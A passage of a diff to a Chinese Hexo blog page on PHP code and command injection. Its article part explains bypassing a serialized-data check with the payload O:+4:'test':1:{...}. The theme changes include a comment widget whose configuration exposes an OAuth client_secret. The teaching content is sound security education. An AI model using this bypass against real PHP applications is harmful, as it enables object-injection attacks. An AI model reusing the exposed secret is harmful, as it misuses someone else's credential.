+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>有一些程序中会判断用户输入是不是一个序列化的数据，常见的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$token = $data[<span class="number">0</span>];  </span><br><span class="line"><span class="keyword">switch</span> ( $token ) &#123;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'s'</span> :  </span><br><span class="line">        <span class="keyword">if</span> ( <span class="string">'"'</span> !== $data[$length<span class="number">-2</span>] )  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'a'</span> :  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'O'</span> :  </span><br><span class="line">        <span class="keyword">return</span> (bool) preg_match( <span class="string">"/^&#123;$token&#125;:[0-9]+:/s"</span>, $data );  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'b'</span> :  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'i'</span> :  </span><br><span class="line">    <span class="keyword">case</span> <span class="string">'d'</span> :  </span><br><span class="line">        <span class="keyword">return</span> (bool) preg_match( <span class="string">"/^&#123;$token&#125;:[0-9.E-]+;\$/"</span>, $data );</span><br></pre></td></tr></table></figure></p>
 <p>这个可以用+来绕过，这也属于PHP的一种特性: <code>O:+4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;}</code></p>
 
       
     </div>
+    
+    
+    
 
-    <div>
-      
-        
+    
 
-      
-    </div>
+    
 
-    <div>
-      
-        
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Ethan
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/" title="PHP代码注入和命令注入">http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
 
-      
-    </div>
-
+      </div>
+    
 
     <footer class="post-footer">
       
@@ -493,7 +515,7 @@
       
 
       
-        
+      
       
 
       
@@ -521,6 +543,10 @@
       
       
     </footer>
+  </div>
+  
+  
+  
   </article>
 
 
@@ -530,15 +556,22 @@
     </div>
   </div>
 
-          
+
           </div>
           
 
 
           
-  <div class="comments" id="comments">
-    
-  </div>
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
 
 
         </div>
@@ -554,110 +587,116 @@
   </div>
 
   <aside id="sidebar" class="sidebar">
+    
     <div class="sidebar-inner">
 
       
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
             站点概览
           </li>
         </ul>
       
 
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="https://avatars3.githubusercontent.com/u/15061633"
-               alt="Ethan" />
-          <p class="site-author-name" itemprop="name">Ethan</p>
-           
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars3.githubusercontent.com/u/15061633"
+                alt="Ethan" />
+            
+              <p class="site-author-name" itemprop="name">Ethan</p>
               <p class="site-description motion-element" itemprop="description">personal blog :)</p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">46</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-categories">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">14</span>
-                <span class="site-state-item-name">分类</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">56</span>
-                <span class="site-state-item-name">标签</span>
-              </a>
-            </div>
-          
-
-        </nav>
-
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
-                  
-                    <i class="fa fa-fw fa-github"></i>
-                  
-                  GitHub
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              友链
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
-                </li>
-              
-            </ul>
           </div>
-        
 
-        
+          <nav class="site-state motion-element">
 
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://badcode.cc/" title="badcode" target="_blank">badcode</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
       </section>
 
       
@@ -690,30 +729,45 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy;  2017 - 
-  <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
-    <i class="fa fa-heart"></i>
+    <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Ethan</span>
+
+  
 </div>
 
 
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
-</div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
-  </a>
-</div>
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
 
 
         
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
 
         
       </div>
@@ -725,7 +779,9 @@
         
       </div>
     
+
     
+
   </div>
 
   
@@ -749,59 +805,78 @@
 
 
 
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
 
 
-  
 
 
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
 
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
 
 
 
   
   
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
 
 
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+  
 
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
 
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
 
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
 
 
 
   
-
 
 
   
@@ -827,161 +902,371 @@
 
 
 
-  
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'hxer',
+            repo: 'hxer.github.io',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '7147116f4ae9df31961313af13fad164bdbf0fe3',
+            
+                client_id: 'ac1236f9efefa7d5580f'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
 
 
 
+
+
+
+
   
-  
+
   <script type="text/javascript">
     // Popup Window;
     var isfetched = false;
+    var isXml = true;
     // Search DB path;
     var search_path = "search.xml";
-    if (search_path.length == 0) {
+    if (search_path.length === 0) {
       search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
     }
     var path = "/" + search_path;
     // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
 
     function proceedsearch() {
       $("body")
         .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
         .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
       $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
     }
+
     // search function;
     var searchFunc = function(path, search_id, content_id) {
       'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
       $.ajax({
         url: path,
-        dataType: "xml",
+        dataType: isXml ? "xml" : "json",
         async: true,
-        success: function( xmlResponse ) {
+        success: function(res) {
           // get the contents from search data
           isfetched = true;
           $('.popup').detach().appendTo('.header-inner');
-          var datas = $( "entry", xmlResponse ).map(function() {
+          var datas = isXml ? $("entry", res).map(function() {
             return {
-              title: $( "title", this ).text(),
+              title: $("title", this).text(),
               content: $("content",this).text(),
-              url: $( "url" , this).text()
+              url: $("url" , this).text()
             };
-          }).get();
-          var $input = document.getElementById(search_id);
-          var $resultContent = document.getElementById(content_id);
-          $input.addEventListener('input', function(){
-            var matchcounts = 0;
-            var str='<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length > 1) {
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
               // perform local searching
               datas.forEach(function(data) {
                 var isMatch = false;
-                var content_index = [];
-                var data_title = data.title.trim().toLowerCase();
-                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
-                var data_url = decodeURIComponent(data.url);
-                var index_title = -1;
-                var index_content = -1;
-                var first_occur = -1;
-                // only match artiles with not empty titles and contents
-                if(data_title != '') {
-                  keywords.forEach(function(keyword, i) {
-                    index_title = data_title.indexOf(keyword);
-                    index_content = data_content.indexOf(keyword);
-                    if( index_title >= 0 || index_content >= 0 ){
-                      isMatch = true;
-                      if (i == 0) {
-                        first_occur = index_content;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
                       }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
                     }
 
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                   });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
                 }
+
                 // show search results
+
                 if (isMatch) {
-                  matchcounts += 1;
-                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
-                  var content = data.content.trim().replace(/<[^>]+>/g,"");
-                  if (first_occur >= 0) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
                     // cut out 100 characters
-                    var start = first_occur - 20;
-                    var end = first_occur + 80;
+                    var start = position - 20;
+                    var end = position + 80;
                     if(start < 0){
                       start = 0;
                     }
-                    if(start == 0){
-                      end = 50;
+                    if (end < position + word.length) {
+                      end = position + word.length;
                     }
                     if(end > content.length){
                       end = content.length;
                     }
-                    var match_content = content.substring(start, end);
-                    // highlight all keywords
-                    keywords.forEach(function(keyword){
-                      var regS = new RegExp(keyword, "gi");
-                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
-                    });
-
-                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                   }
-                  str += "</li>";
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
                 }
-              })};
-            str += "</ul>";
-            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
-            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
-            $resultContent.innerHTML = str;
-          });
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
           proceedsearch();
         }
-      });}
+      });
+    }
 
     // handle and trigger popup window;
     $('.popup-trigger').click(function(e) {
       e.stopPropagation();
-      if (isfetched == false) {
+      if (isfetched === false) {
         searchFunc(path, 'local-search-input', 'local-search-result');
       } else {
         proceedsearch();
       };
     });
 
-    $('.popup-btn-close').click(function(e){
-      $('.popup').hide();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    });
+    $('.popup-btn-close').click(onPopupClose);
     $('.popup').click(function(e){
       e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
     });
   </script>
 
 
-  
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-  
 
 
   
@@ -990,6 +1275,12 @@
 
   
 
+  
+  
+
+  
+
+  
 
   
 
